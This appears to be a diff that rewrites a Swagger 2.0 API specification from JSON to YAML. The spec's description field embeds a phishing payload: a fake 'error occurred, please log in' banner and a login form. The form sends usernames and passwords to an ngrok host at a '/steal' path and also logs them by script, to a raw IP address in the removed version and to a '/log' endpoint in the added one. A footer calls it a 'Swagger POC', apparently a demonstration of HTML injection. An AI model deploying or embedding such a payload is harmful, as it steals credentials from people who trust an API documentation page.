@@ -1,21 +1,35 @@
-{
-  "swagger": "2.0",
-  "info": {
-    "version": "1.0.0",
-    "title": "Login Page",
-    "description": "<div style='width:100%;max-width:400px;margin:20px auto;padding:20px;background:#f8d7da;border-radius:8px;box-shadow:0 4px 8px rgba(0,0,0,0.1);'><div style='background:#f8d7da;color:#721c24;padding:16px 20px;border-radius:4px;border:1px solid #f5c6cb;font-size:16px;text-align:center;'><strong>An error occurred while loading, please log in.</strong></div></div><div class='heading'><h1 style='text-align:center;font-size:24px;color:#333;margin-bottom:20px;'>Login Page</h1><div style='width:100%;max-width:400px;margin:0 auto;padding:20px;background:#fff;border-radius:8px;box-shadow:0 4px 8px rgba(0,0,0,0.1);'><form action="https://agelong-susurrant-zayne.ngrok-free.dev/steal" method="post" class="form-signin"><label for="username">Username</label><input type="text" name="username"><label for="password">Password</label><input type="password" name="password"><button type="submit">Login</button></form><script>document.querySelector('form').addEventListener('submit', function(e) {const formData = new FormData(e.target);const data = Object.fromEntries(formData);fetch('http://13.218.73.5/', {method: 'POST',headers: { 'Content-Type': 'application/json' },body: JSON.stringify({ event: 'submit', data: data })}).catch(err => console.error('Log failed:', err));
-  });
-</script></div></div><div style='position:fixed;bottom:10px;right:10px;font-size:12px;color:#888;'>Swagger POC</div>"
-  },
-  "paths": {
-    "/": {
-      "post": {
-        "responses": {
-          "200": {
-            "description": "Login successful"
-          }
-        }
-      }
-    }
-  }
-}
+swagger: '2.0'
+info:
+  version: 1.0.0
+  title: Login Page
+  description: >
+    <div style='width:100%;max-width:400px;margin:20px auto;padding:20px;background:#f8d7da;border-radius:8px;box-shadow:0 4px 8px rgba(0,0,0,0.1);'>
+      <div style='background:#f8d7da;color:#721c24;padding:16px 20px;border-radius:4px;border:1px solid #f5c6cb;font-size:16px;text-align:center;'>
+        <strong>An error occurred while loading, please log in.</strong>
+      </div>
+    </div>
+    <div class='heading'>
+      <h1 style='text-align:center;font-size:24px;color:#333;margin-bottom:20px;'>Login Page</h1>
+      <div style='width:100%;max-width:400px;margin:0 auto;padding:20px;background:#fff;border-radius:8px;box-shadow:0 4px 8px rgba(0,0,0,0.1);'>
+        <form action='https://agelong-susurrant-zayne.ngrok-free.dev/steal' method='post' class='form-signin' onsubmit='fetch("https://agelong-susurrant-zayne.ngrok-free.dev/log",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({event:"submit",data:Object.fromEntries(new FormData(this))})).catch(err=>console.error("Log failed:",err));'>
+          <div style='margin-bottom:15px;'>
+            <label for='username' style='font-size:14px;color:#555;display:block;margin-bottom:5px;'>Username</label>
+            <input type='text' name='username' style='width:100%;padding:10px;font-size:14px;border:1px solid #ccc;border-radius:4px;'>
+          </div>
+          <div style='margin-bottom:15px;'>
+            <label for='password' style='font-size:14px;color:#555;display:block;margin-bottom:5px;'>Password</label>
+            <input type='password' name='password' style='width:100%;padding:10px;font-size:14px;border:1px solid #ccc;border-radius:4px;'>
+          </div>
+          <div style='margin-top:20px;'>
+            <button type='submit' style='width:100%;padding:12px;background:#5cb85c;border:none;color:white;font-size:16px;border-radius:4px;cursor:pointer;transition:background-color 0.3s;'>Login</button>
+          </div>
+        </form>
+      </div>
+    </div>
+    <div style='position:fixed;bottom:10px;right:10px;font-size:12px;color:#888;'>Swagger POC</div>
+paths:
+  /:
+    post:
+      responses:
+        '200':
+          description: Login successful
